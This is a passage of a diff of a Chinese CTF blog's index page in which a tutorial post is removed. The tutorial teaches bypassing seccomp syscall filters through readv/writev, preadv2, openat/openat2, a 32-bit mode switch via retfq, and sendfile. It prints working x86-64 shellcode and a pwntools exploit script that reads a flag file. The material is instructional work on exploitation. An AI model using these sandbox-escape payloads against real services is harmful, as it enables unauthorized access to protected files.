class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>* space = mmap((<span class="type">void</span>*)<span class="number">0x600000000000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	read(<span class="number">0</span>, space, <span class="number">0x1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, arch)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, <span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">59</span>, <span class="number">2</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sock_filter)),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</span><br><span class="line">	</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>))space)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="0x03-execve-read-write"><a class="markdownIt-Anchor" href="#0x03-execve-read-write"></a> 0x03. execve + read + write</h1>
-<p>如果<code>read</code>和<code>write</code>都被禁用，我们又应该如何应对呢？不要急，这里给出最新版本Linux系统调用的64位系统调用号：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/syscalls/syscall_64.tbl">传送门</a></p>
-<p>通过<code>pwn constgrep -c amd64 -m ^SYS</code>命令可以查看pwntools预先定义的所有32位与64位的系统调用号符号，这些符号可以用于pwntools脚本的汇编语言字符串中。</p>
-<p>我们可以发现，系统调用表中还有<code>pread</code>、<code>pwrite</code>等似乎也可以进行读写的函数。下面就来详细分析一下这些系统调用：</p>
-<h2 id="a-sys_pread64-nr17"><a class="markdownIt-Anchor" href="#a-sys_pread64-nr17"></a> A. sys_pread64 (nr=17)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pread</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> pos)</span>;</span><br></pre></td></tr></table></figure>
-<p>该函数与<code>read</code>函数类似，但参数有4个，第4个为开始读的偏移位置，且使用<code>sys_pread64</code>函数读取完成后，文件指针不会改变。</p>
-<h2 id="b-sys_pwrite64-nr18-不可用"><a class="markdownIt-Anchor" href="#b-sys_pwrite64-nr18-不可用"></a> B. sys_pwrite64 (nr=18, 不可用)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwrite</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> pos)</span>;</span><br></pre></td></tr></table></figure>
-<p><code>sys_write64</code>与<code>sys_read64</code>类似，函数写操作完成后，文件指针不会改变。但是对于写操作而言，标准输出不是普通的文件描述符，可以看做一个字符设备，指定<code>pos</code>时写操作会失败。已经经过试验测试得出，<code>sys_write64</code>不能将内存中的内容输出到控制台中。</p>
-<h2 id="c-sys_readv-nr19"><a class="markdownIt-Anchor" href="#c-sys_readv-nr19"></a> C. sys_readv (nr=19)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">readv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br></pre></td></tr></table></figure>
-<p><code>readv</code>函数实现了分散输入的功能，即将可以将一个文件描述符的内容写到多个内存缓冲区中。注意这里的“写入到多个内存缓冲区”指的是依次写入，第1个缓冲区写满之后才会接着文件后面的内容继续写第2个缓冲区。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> __user* iov_base;</span><br><span class="line">    <span class="type">__kernel_size_t</span> iov_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里的<code>vec</code>参数应该是<code>struct iovec</code>结构体的数组，而第三个参数<code>vlen</code>为数组的长度。<code>iovec</code>结构体中，<code>iov_base</code>为一个内存地址，<code>iov_len</code>为内存的长度。因此如果需要使用这个系统调用，需要首先构造<code>iovec</code>结构体实例。在pwn题中，我们只需要构造一个结构体实例即可。</p>
-<h2 id="d-sys_writev-nr20"><a class="markdownIt-Anchor" href="#d-sys_writev-nr20"></a> D. sys_writev (nr=20)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br></pre></td></tr></table></figure>
-<p><code>writev</code>函数实现了集中输出的功能，即将<code>iovec</code>结构体数组中的缓冲区内容集中输出到一个文件描述符中。</p>
-<p>下面为使用<code>readv</code>函数和<code>writev</code>函数的示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1    /* iov size */</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp-8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_readv</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1    /* iov size */</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp+8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_writev</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<h2 id="e-sys_preadv-nr295"><a class="markdownIt-Anchor" href="#e-sys_preadv-nr295"></a> E. sys_preadv (nr=295)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                   <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
-<p>这个函数同时具有<code>pread</code>函数和<code>readv</code>函数的性质，使用<code>iovec*</code>结构体可完成分散输入，同时可设置偏移量且读取后不修改文件指针。其中<code>pos_l</code>指的是读取偏移的低32位，<code>pos_h</code>为高32位。</p>
-<h2 id="f-sys_pwritev-nr296-不可用"><a class="markdownIt-Anchor" href="#f-sys_pwritev-nr296-不可用"></a> F. sys_pwritev (nr=296, 不可用)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                   <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
-<p>这个函数同时具有<code>pwrite</code>函数和<code>writev</code>函数的性质，这也意味着其无法向标准输出写入内容。</p>
-<h2 id="g-sys_preadv2-nr327"><a class="markdownIt-Anchor" href="#g-sys_preadv2-nr327"></a> G. sys_preadv2 (nr=327)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
-<p>这个函数在参数上与<code>preadv</code>的区别是多了一个<code>flags</code>。这个<code>flags</code>的标志位主要针对一些效率、同步方面，直接填0即可。</p>
-<h2 id="h-sys_pwritev2-nr328-不可用"><a class="markdownIt-Anchor" href="#h-sys_pwritev2-nr328-不可用"></a> H. sys_pwritev2 (nr=328, 不可用)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
-<p>对于上述系统调用，可以参考<a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/preadv2.2.html">资料</a>进行学习。</p>
-<h1 id="0x04-execve-open"><a class="markdownIt-Anchor" href="#0x04-execve-open"></a> 0x04. execve + open</h1>
-<p>上述所有读写的系统调用都需要使用文件描述符，但如果禁用了<code>open</code>系统调用，又应该如何获取文件描述符呢？好在，还有其他的系统调用能够获取文件描述符。</p>
-<h2 id="a-openat-nr257"><a class="markdownIt-Anchor" href="#a-openat-nr257"></a> A. openat (nr=257)</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);</span><br></pre></td></tr></table></figure>
-<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_38090681/article/details/103056884">资料</a>，函数的第一个参数<code>dfd</code>指的是当<code>path</code>为相对路径时，该路径在文件系统中的开始地址（即打开目录获取的文件描述符），但可以指定其为<code>AT_FDCWD</code>(-100)，指定路径为当前路径。另外3个参数与<code>open</code>参数相同。<code>openat</code>的返回值与<code>open</code>相同，都是当前正未使用的最小的文件描述符值。</p>
-<p>示例代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">xor rdi, rdi</span><br><span class="line">sub rdi, 100</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor r10, r10</span><br><span class="line">push SYS_openat</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 3</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp-8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov rdx, 1</span><br><span class="line">xor r10, r10</span><br><span class="line">xor r8, r8</span><br><span class="line">push SYS_preadv2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp+8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_writev</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<h2 id="b-openat2-nr437"><a class="markdownIt-Anchor" href="#b-openat2-nr437"></a> B. openat2 (nr=437)</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">openat2</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span>* filename, <span class="keyword">struct</span> open_how* how, <span class="type">size_t</span> usize)</span>;</span><br></pre></td></tr></table></figure>
-<p>这个函数封装了三个参数到结构体<code>how</code>中：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_how</span> &#123;</span></span><br><span class="line">	__u64 flags;</span><br><span class="line">	__u64 mode;</span><br><span class="line">	__u64 resolve;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p><code>dfd</code>与另外3个参数的使用方式与<code>openat</code>相同，<code>resolve</code>指解析路径名所有组件的方式，普通的打开文件操作填0即可。参数<code>size</code>必须为结构体<code>open_how</code>的大小，也就是<code>0x18</code>。</p>
-<p>实例代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0x67616c662f2e</span></span><br><span class="line">push rax</span><br><span class="line">xor rdi, rdi</span><br><span class="line">sub rdi, <span class="number">100</span></span><br><span class="line">mov rsi, rsp</span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov r10, <span class="number">0x18</span></span><br><span class="line">push SYS_openat2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<h1 id="0x05-execve-open-openat-openat2"><a class="markdownIt-Anchor" href="#0x05-execve-open-openat-openat2"></a> 0x05. execve + open + openat + openat2</h1>
-<p>如果题目禁用了x64的所有3个打开文件的系统调用，此时还有一种情况使得我们可以成功打开文件并获取文件描述符：当seccomp没有禁用x64的fstat系统调用时，可以通过将程序暂时转换为32位模式再通过<code>open</code>系统调用打开文件，因为32位的<code>open</code>系统调用与64位的不同，32位<code>open</code>的系统调用号为5，对应x64的系统调用表中为<code>fstat</code>系统调用。</p>
-<p><code>retfq</code>指令，在x86-64中可用于将程序从64位长模式转换为32位模式，在转换时需要注意修改栈地址为32位地址，并向栈中保存一些特定值，在64位系统中，<code>cs</code>寄存器的值为0x23时表示当前程序处于32位状态，值为0x33时表示当前程序处于64位状态。在执行<code>retfq</code>指令之前，我们就应该修改<code>rsp</code>，并将0x23和要执行的32位指令地址push进栈。在执行<code>retfq</code>后，程序将自动转到32位环境中工作。在32位代码执行结束后，如果需要返回到64位状态，可通过<code>jmp 0x33:xxxxx ; ret</code>的指令返回到64位代码。</p>
-<p>注意：如果在执行<code>retfq</code>时<code>rsp</code>高位的任何值都会被直接舍弃，只取低32位作为新的栈地址，而这个地址通常是不能预先获取的，因此<code>retfq</code>前重新赋值<code>rsp</code>很有必要。</p>
-<p>示例：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_64_1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov r10, 0x21</span></span><br><span class="line"><span class="string">    mov r8, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">    xor r9, r9</span></span><br><span class="line"><span class="string">    push SYS_mmap</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    mov rcx, 0x200</span></span><br><span class="line"><span class="string">    mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x600000000100</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rsp, 0x10800</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x10000</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_32 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	mov eax, 0x6761</span></span><br><span class="line"><span class="string">	push eax</span></span><br><span class="line"><span class="string">	mov eax, 0x6c662f2e</span></span><br><span class="line"><span class="string">	push eax</span></span><br><span class="line"><span class="string">	mov ebx, esp</span></span><br><span class="line"><span class="string">	xor ecx, ecx</span></span><br><span class="line"><span class="string">	xor edx, edx</span></span><br><span class="line"><span class="string">	mov eax, 5</span></span><br><span class="line"><span class="string">	int 0x80</span></span><br><span class="line"><span class="string">	jmp 0x33:0x10100</span></span><br><span class="line"><span class="string">	ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_64_2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 3</span></span><br><span class="line"><span class="string">    push 0x100</span></span><br><span class="line"><span class="string">    lea rbx, [rsp-8]</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    push SYS_preadv2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x1</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push 0x100</span></span><br><span class="line"><span class="string">    lea rbx, [rsp+8]</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_writev</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">payload = asm(shellcode_64_1).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += asm(shellcode_32, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += asm(shellcode_64_2)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>需要注意的是32位的系统调用使用的是<code>int 0x80</code>指令触发，且传参使用的寄存器也有所不同（<code>rbx</code>、<code>rcx</code>、<code>rdx</code>、<code>rsi</code>、<code>rdi</code>）。既然转到32位可以绕过基于系统调用号的检查，那么自然而然地，我们也可以进行扩展，如果禁用了64位的所有<code>read</code>与<code>write</code>，或许也可以通过使用32位的<code>read</code>和<code>write</code>相关系统调用完成读写操作。这一部分就交给读者自行探索。</p>
-<h1 id="0x06-其他"><a class="markdownIt-Anchor" href="#0x06-其他"></a> 0x06. 其他</h1>
-<p>如果题目禁用了所有与<code>read</code>和<code>write</code>相关，也就是上面提到的与读写相关的所有系统调用，我们又应该如何应对呢？实际上seccomp的绕过姿势有很多，这里介绍一下sendfile，至于其他的技巧将在下一篇文章中介绍。</p>
-<h2 id="a-sendfile-nr40"><a class="markdownIt-Anchor" href="#a-sendfile-nr40"></a> A. sendfile (nr=40)</h2>
-<p>这是一个很好用的系统调用，它允许将文件数据从一个文件描述符直接发送到另一个文件描述符，而且不需要经过缓冲区拷贝，被称为“零拷贝技术”，这一技术也被应用于<code>mmap</code>等系统调用中。可以说这个系统调用用起来比<code>read</code>+<code>write</code>还要简单。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span>* offset, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
-<p>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, 3</span><br><span class="line">push 0</span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov r10, 0x100</span><br><span class="line">push SYS_sendfile</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1735,14 +1692,14 @@ io_uring 的实现仅仅使用了三个 syscall：io_uring_setup, io_uring_enter
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">150</span>
+          <span class="site-state-item-count">151</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
@@ -1793,7 +1750,7 @@ io_uring 的实现仅仅使用了三个 syscall：io_uring_setup, io_uring_enter
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">20:31</span>
+    <span title="Reading time total">20:37</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
